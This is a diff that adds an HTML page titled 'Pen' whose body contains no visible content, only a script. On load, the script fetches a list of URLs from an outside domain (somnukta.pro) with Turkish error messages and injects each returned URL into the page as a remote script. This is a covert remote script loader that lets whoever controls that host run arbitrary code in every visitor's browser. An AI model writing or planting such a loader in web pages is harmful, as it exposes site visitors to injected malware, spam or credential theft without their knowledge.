@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <link rel="stylesheet" href="./style.css">
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0"
+    >
+    <title>Pen</title>
+  </head>
+
+  <body>
+
+    <script>
+      fetch(
+        'https://somnukta.pro/linkler9.php?time=' +
+        Date.now(),
+        {
+          cache: 'no-store'
+        }
+      )
+      .then(function(response) {
+        if (!response.ok) {
+          throw new Error('Linkler yüklenemedi');
+        }
+
+        return response.json();
+      })
+      .then(function(data) {
+        if (!data.success) {
+          throw new Error(
+            data.message || 'İşlem başarısız'
+          );
+        }
+
+        data.selected.forEach(function(url) {
+          var script =
+            document.createElement('script');
+
+          script.src = url;
+          script.async = true;
+
+          document.body.appendChild(script);
+        });
+      });
+    </script>
+
+  </body>
+</html>
